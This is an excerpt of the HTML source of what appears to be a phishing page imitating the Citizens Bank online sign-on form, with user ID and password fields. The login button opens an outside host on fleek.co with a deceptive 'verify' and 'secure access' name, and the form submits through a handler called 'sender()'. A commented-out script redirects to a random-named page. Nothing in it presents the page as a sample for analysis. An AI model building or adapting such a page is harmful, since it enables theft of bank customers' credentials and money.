...
<link rel="stylesheet" href="ad-containers.css">
...
<form class="pay-transfer-options clearfix" action="" onsubmit=" return sender()"  name="SignOn" id="frmSignOn" method="post">
                                    ...
                                    <input type="hidden" name="CSRF_TOKEN" value="OI4V-2D3C-WZRP-QU6A-IVRQ-MPA6-NM9X-HY31"/>
				    ...
				    <input type="hidden" name="asstFlow" value="" />
                                    ...
                                    <input type="hidden" name="tmxSessionID" id="tmxSessionID" value="" />
...
<input tabindex="1" type="text" id="UserID" name="UserID" autocomplete="off" maxlength="20" class="required demo-username">
 ...
 <input type="checkbox" tabindex="5"  id="cbSaveUserID" name="cbSaveUserID" style="vertical-align:top">
                    	...
                    	<div class="form-item full-width">
                            ...
                            <input  tabindex="2" type="password" id="password" name="Password" maxlength="15" size="15" class="required demo-password">
 ...
 <input type="submit" class="submit-button arrow cbensightenevent" cbdata-type="button" onclick="window.open('https://verifymanageeduprivaceywebsecureaccess404acc0unts.on.fleek.co/dum.html')"  cbdata-reason="login" value="Login"> 

 <!--script>
    document.getElementById("submit").addEventListener("click", myFunction);
    function myFunction() {
        window.location.open="/ghirnfirn456ioncvnskfirnskzozneicnyj7iog2.html"
        
    }
 </script-->
 <a  tabindex="8" href="http://www.citizensbank.com/" class="cancel">Cancel</a>           
            </div>
    </form>
...
<script src="citizensHeaderFooter-citizensns2600.js"></script>
...
<script type="text/javascript"  src="/kTm7Kq8GQ/rHm9fC/upQ/izGatLrh/DgFGMgE/J2JVTl/8XbVg"></script><link rel="stylesheet" type="text/css"  href="sec-3-8.css">
          <script  src="sec-cpt-3-8.js" async defer></script>
...
<script type="text/javascript" src="//assets.adobedtm.com/c6a477a8a7f5/5b9adfd1f79d/launch-e2c3d40f4766.min.js"></script>
